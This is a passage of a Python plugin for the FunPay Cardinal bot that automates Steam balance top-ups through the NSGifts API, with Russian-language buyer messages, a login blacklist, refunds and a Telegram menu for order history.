            cardinal.send_message(chat_id, f"❌ Сумма {format_amount(quantity, currency)} вне лимитов ({min_amount} - {max_amount}). Средства возвращены.")
            if SETTINGS["notification_types"]["refund"]:
                send_notification(cardinal, order_id, "refund", {
                    "steam_login": "Не указан", 
                    "quantity": quantity, 
                    "currency": currency, 
                    "timestamp": time.time()
                })
            FUNPAY_STATES.pop((chat_id, buyer_id), None)
            return
            
        steam_login = extract_steam_login(order.html)
        if steam_login:
            if order.status in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
                FUNPAY_STATES.pop((chat_id, buyer_id), None)
                return
                
            amount_text = format_amount(quantity, currency)
            response_text = SETTINGS["templates"]["start_message"].format(
                steam_login=steam_login,
                amount=amount_text
            )
            
            cardinal.send_message(chat_id, response_text)
            FUNPAY_STATES[(chat_id, buyer_id)] = {
                "state": "confirming_login", 
                "data": {
                    "steam_login": steam_login, 
                    "order_id": order_id, 
                    "currency": currency, 
                    "quantity": float(quantity)
                }
            }
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} Ошибка обработки заказа #{order_id}: {e}")
        FUNPAY_STATES.pop((chat_id, buyer_id), None)

def extract_field(html: str, field: str):
    soup = BeautifulSoup(html, 'lxml')
    for item in soup.find_all('div', class_='param-item'):
        h5 = item.find('h5')
        if h5 and field in h5.text:
            bold = item.find('div', class_='text-bold')
            if bold:
                text = bold.text.strip()
                if field == "Количество":
                    return float(re.sub(r'[^\d.]', '', text)) if re.sub(r'[^\d.]', '', text) else None
                return text
    return None

extract_steam_login = lambda html: extract_field(html, "Логин Steam")

def extract_currency(html: str) -> str:
    raw = extract_field(html, "Тип валюты")
    if not raw:
        return None
    currency = ''.join(filter(str.isalpha, raw)).upper()
    return currency if currency in ["RUB", "UAH", "KZT"] else None

extract_quantity = lambda html: extract_field(html, "Количество")

def get_token():
    if time.time() < TOKEN_DATA["expiry"]:
        return TOKEN_DATA["token"]
    payload = {"email": SETTINGS["api_login"], "password": SETTINGS["api_password"]}
    response = requests.post("https://api.ns.gifts/api/v1/get_token", json=payload)
    if response.status_code == 200:
        data = response.json()
        TOKEN_DATA["token"] = data.get("token") or data.get("access_token") or data["data"]["token"]
        TOKEN_DATA["expiry"] = data.get("valid_thru", time.time() + 7200)
        return TOKEN_DATA["token"]
    raise Exception(f"Не удалось получить токен: {response.status_code}")

def get_steam_amount(amount: float, currency: str = "RUB"):
    token = get_token()
    response = requests.post("https://api.ns.gifts/api/v1/steam/get_amount", 
                           json={"amount": round(amount, 2), "currency": currency}, 
                           headers={"Authorization": f"Bearer {token}"})
    if response.status_code == 200:
        return float(response.json().get("usd_price", 0))
    logger.error(f"{LOGGER_PREFIX} Ошибка при получении курса: {response.status_code} - {response.text}")
    raise Exception(f"Ошибка API NSGifts: {response.status_code}")

def create_order(service_id: int, quantity: str, data: str):
    token = get_token()
    custom_id = str(uuid.uuid4())
    response = requests.post("https://api.ns.gifts/api/v1/create_order", 
                           json={"service_id": service_id, "quantity": quantity, "custom_id": custom_id, "data": data}, 
                           headers={"Authorization": f"Bearer {token}"})
    if response.status_code == 200:
        return response.json().get("custom_id")
    error_text = response.text
    if response.status_code == 400 and "There is no such login" in error_text:
        raise Exception("InvalidLogin")
    raise Exception(f"Не удалось создать заказ: {response.status_code} - {error_text}")

def pay_order(custom_id: str):
    token = get_token()
    response = requests.post("https://api.ns.gifts/api/v1/pay_order", 
                           json={"custom_id": custom_id}, 
                           headers={"Authorization": f"Bearer {token}"})
    if response.status_code == 200:
        return True
    error_message = response.json().get("detail", "Неизвестная ошибка")
    if "Недостаточно средств" in error_message:
        raise Exception("InsufficientFunds")
    raise Exception(f"Не удалось оплатить: {response.status_code} - {error_message}")

def perform_top_up(cardinal: Cardinal, order_id: str, steam_login: str, currency: str, quantity: float, chat_id: int, author_id: int):
    state_key = (chat_id, author_id)
    black_list = load_black_list()
    if steam_login.lower() in black_list:
        cardinal.send_message(chat_id, "❌ Ваш логин в ЧС. Ожидайте продавца.")
        order = cardinal.account.get_order(order_id)
        send_notification(cardinal, order_id, "error", {
            "message": f"Логин в ЧС",
            "steam_login": steam_login,
            "buyer_username": order.buyer_username
        })
        FUNPAY_STATES.pop(state_key, None)
        return
        
    try:
        order = cardinal.account.get_order(order_id)
        if order.status in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
            FUNPAY_STATES.pop(state_key, None)
            return
            
        rates = get_currency_rates()
        rate = rates.get(f"{currency.lower()}/usd", 0)
        amount_usd = round(float(quantity) / float(rate), 2) if rate != 0 else 0.22
        
        custom_id = create_order(1, f"{amount_usd:.2f}", steam_login)
        pay_order(custom_id)
        
        current_time = time.strftime('%H:%M:%S | %Y-%m-%d')
        amount_text = format_amount(quantity, currency)
        
        success_text = SETTINGS["templates"]["success_message"].format(
            steam_login=steam_login,
            amount=amount_text,
            time=current_time,
            order_id=order_id
        )
        
        cardinal.send_message(chat_id, success_text)
        
        if SETTINGS["notification_types"]["success"]:
            send_notification(cardinal, order_id, "success", {
                "steam_login": steam_login, 
                "quantity": float(quantity), 
                "currency": currency, 
                "timestamp": time.time(), 
                "amount_usd": amount_usd, 
                "rate": rate
            })
            
        order_info = {
            "order_id": order_id,
            "buyer_username": order.buyer_username,
            "buyer_id": order.buyer_id,
            "sum": order.sum,
            "currency": currency,
            "quantity": float(quantity),
            "steam_login": steam_login,
            "status": "success",
            "timestamp": time.time(),
            "amount_usd": amount_usd,
            "rate": rate
        }
        
        orders = load_orders()
        orders.append(order_info)
        save_orders(orders)
        FUNPAY_STATES.pop(state_key, None)
        
    except Exception as e:
        error_msg = str(e)
        if error_msg == "InvalidLogin":
            cardinal.send_message(chat_id, "❌ Логин не существует. Введите правильный логин.")
            FUNPAY_STATES[state_key] = {"state": "waiting_for_steam_login", "data": {"order_id": order_id}}
        else:
            cardinal.send_message(chat_id, "❌ Ошибка при выполнении заказа")
            if SETTINGS["notification_types"]["error"]:
                send_notification(cardinal, order_id, "error", {
                    "steam_login": steam_login, 
                    "quantity": float(quantity), 
                    "currency": currency, 
                    "timestamp": time.time(), 
                    "message": f"Ошибка: {error_msg}"
                })
            if error_msg == "InsufficientFunds":
                deactivate_lots_on_error()
            if SETTINGS["auto_refund_on_error"]:
                refund_and_cleanup(cardinal, order_id, chat_id, author_id, steam_login)

def check_order_confirmation(cardinal: Cardinal, order_id: str, chat_id: int, author_id: int):
    time.sleep(2 * 60)
    order = cardinal.account.get_order(order_id)
    if order.status not in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
        reminder_text = SETTINGS["templates"]["reminder_message"].format(order_id=order_id)
        cardinal.send_message(chat_id, reminder_text)

def order_history(call: telebot.types.CallbackQuery):
    chat_id, page = call.message.chat.id, int(call.data.split(":")[1]) if len(call.data.split(":")) > 1 else 1
    orders = sorted(load_orders(), key=lambda x: x.get("timestamp", 0), reverse=True)
    
    if not orders:
        bot.edit_message_text("💙 История заказов пуста", chat_id, call.message.id, 
                             reply_markup=K().add(B("◀️ Назад", callback_data="steam_back")), 
                             parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return
        
    items_per_page, total_items = 10, len(orders)
    total_pages = (total_items + items_per_page - 1) // items_per_page
    page = max(1, min(page, total_pages))
    start_idx = (page - 1) * items_per_page
    page_orders = orders[start_idx:start_idx + items_per_page]
    
    markup = K(row_width=1)
    for order in page_orders:
        btn_text = f"💙 #{order.get('order_id')} | {order.get('buyer_username')} | {order.get('sum')}₽"
        markup.add(B(btn_text, callback_data=f"steam_order_details:{order.get('order_id')}:{start_idx}"))
        
    if total_pages > 1:
        buttons = []
        if page > 1:
            buttons.append(B("⏪", callback_data=f"steam_order_history:1"))
            buttons.append(B("◀️", callback_data=f"steam_order_history:{page-1}"))
        buttons.append(B(f"{page}/{total_pages}", callback_data="no_action"))
        if page < total_pages:
            buttons.append(B("▶️", callback_data=f"steam_order_history:{page+1}"))
            buttons.append(B("⏩", callback_data=f"steam_order_history:{total_pages}"))
        markup.row(*buttons)
        
    markup.add(B("◀️ Назад", callback_data="steam_back"))
    
    bot.edit_message_text(f"💙 История заказов\n\nВсего: <code>{total_items}</code>", 
                         chat_id, call.message.id, reply_markup=markup, parse_mode="HTML")
    bot.answer_callback_query(call.id)

def order_details(call: telebot.types.CallbackQuery):
    order_id, start_idx = call.data.split(":")[1], int(call.data.split(":")[2])
    chat_id = call.message.chat.id
    order = next((order for order in load_orders() if order.get("order_id") == order_id), None)
    
    if not order:
        bot.edit_message_text(f"❌ Заказ #{order_id} не найден", chat_id, call.message.id, 
                             reply_markup=K().add(B("◀️ Назад", callback_data="steam_order_history:1")), 
                             parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return
        
    details_text = f"""
<b>💙 Детали заказа #{order_id}</b>

<b>📃 FunPay:</b>
L Статус: <code>Успешно</code>
L Покупатель: <code>{order.get('buyer_username', 'Неизвестно')}</code>
L Сумма: <code>{order.get('sum', 'Неизвестно')}₽</code>

<b>💸 Steam:</b>
L Логин: <code>{order.get('steam_login', 'Неизвестно')}</code>
L Сумма: <code>{format_amount(order.get('quantity', 0), order.get('currency', 'RUB'))}</code>

<b>• Дата:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(order.get('timestamp', 0)))}</code>
    """.strip()
    
    page = (start_idx // 10) + 1
    markup = K(row_width=2).add(
        B("🎮 FunPay", url=f"https://funpay.com/orders/{order_id}/"), 
        B("👤 Покупатель", url=f"https://funpay.com/users/{order.get('buyer_id')}/")
    )
    markup.add(B("◀️ Назад", callback_data=f"steam_order_history:{page}"))
    
    bot.edit_message_text(details_text, chat_id, call.message.id, reply_markup=markup, parse_mode="HTML")
    bot.answer_callback_query(call.id)

def process_new_order(cardinal: Cardinal, message: NewMessageEvent):
    match = re.search(r'заказ #(\w+)', message.text)
    if match:
        order_id = match.group(1)
        buyer_id = cardinal.account.get_order(order_id).buyer_id
        USER_ORDER_QUEUES.setdefault(buyer_id, Queue()).put({"order_id": order_id, "chat_id": message.chat_id})
        threading.Thread(target=process_user_orders, args=(cardinal, buyer_id), daemon=True).start()

def process_user_orders(cardinal: Cardinal, buyer_id: int):
    if buyer_id not in USER_ORDER_QUEUES: return
    queue = USER_ORDER_QUEUES[buyer_id]
    while not queue.empty():
        order_data = queue.get()
        process_order(cardinal, order_data["order_id"], order_data["chat_id"], buyer_id)
        queue.task_done()
    del USER_ORDER_QUEUES[buyer_id]

def init(cardinal: Cardinal):
    global tg, bot, cardinal_instance, previous_balance
    tg, bot, cardinal_instance = cardinal.telegram, cardinal.telegram.bot, cardinal
    load_settings()
    
    send_plugin_backup()

    cardinal.add_telegram_commands(
        UUID,
        [
            ("steam", "управление автопополнением Steam", True),
        ]
    )

    threading.Thread(target=check_balance_periodically, args=(cardinal,), daemon=True).start()
    
    @bot.message_handler(commands=['steam'])
    def handle_steam_command(message):
        steam_command(message)
    
    handlers = [
        (lambda c: open_settings(call=c), lambda c: c.data == "steam_back"),
        (lambda c: set_api(c), lambda c: c.data == "steam_set_api"),
        (lambda c: set_api_field(c, "login"), lambda c: c.data == "steam_set_api_login"),
        (lambda c: set_api_field(c, "password"), lambda c: c.data == "steam_set_api_password"),
        (lambda c: toggle_lots(c), lambda c: c.data.startswith("steam_toggle_lots_")),
        (lambda c: black_list_menu(c), lambda c: c.data == "steam_black_list"),
        (lambda c: add_to_black_list(c), lambda c: c.data == "steam_add_to_black_list"),
        (lambda c: remove_from_black_list(c), lambda c: c.data == "steam_remove_from_black_list"),
        (lambda c: remove_black_list_confirm(c), lambda c: c.data.startswith("steam_remove_black_list_confirm:")),
        (lambda c: toggle_option(c, "auto_refund_on_error"), lambda c: c.data == "steam_toggle_auto_refund"),
        (lambda c: toggle_option(c, "notifications_enabled"), lambda c: c.data == "steam_toggle_notifications"),
        (lambda c: refresh_info(c), lambda c: c.data == "steam_refresh_info"),
        (lambda c: order_history(c), lambda c: c.data.startswith("steam_order_history:")),
        (lambda c: order_details(c), lambda c: c.data.startswith("steam_order_details:")),
        (lambda c: statistics(c), lambda c: c.data == "steam_statistics"),
        (lambda c: templates_menu(c), lambda c: c.data == "steam_templates"),
        (lambda c: edit_template(c), lambda c: c.data.startswith("steam_edit_template:")),
        (lambda c: cancel_input(c), lambda c: c.data == "steam_cancel_input"),
    ]
    
    msg_handlers = [
        (lambda m: on_api_field(m, "login"), lambda m: tg.check_state(m.chat.id, m.from_user.id, "steam_set_api_login")),
        (lambda m: on_api_field(m, "password"), lambda m: tg.check_state(m.chat.id, m.from_user.id, "steam_set_api_password")),
        (on_add_to_black_list, lambda m: tg.check_state(m.chat.id, m.from_user.id, "steam_add_to_black_list")),
        (on_edit_template, lambda m: tg.check_state(m.chat.id, m.from_user.id, "steam_edit_template")),
    ]
    
    for handler, condition in handlers:
        tg.cbq_handler(handler, condition)
        
    for handler, condition in msg_handlers:
        tg.msg_handler(handler, func=condition)
        
    handle_new_message.plugin_uuid = UUID
    if handle_new_message not in cardinal.new_message_handlers:
        cardinal.new_message_handlers.append(handle_new_message)

BIND_TO_PRE_INIT = [init]
BIND_TO_DELETE = None
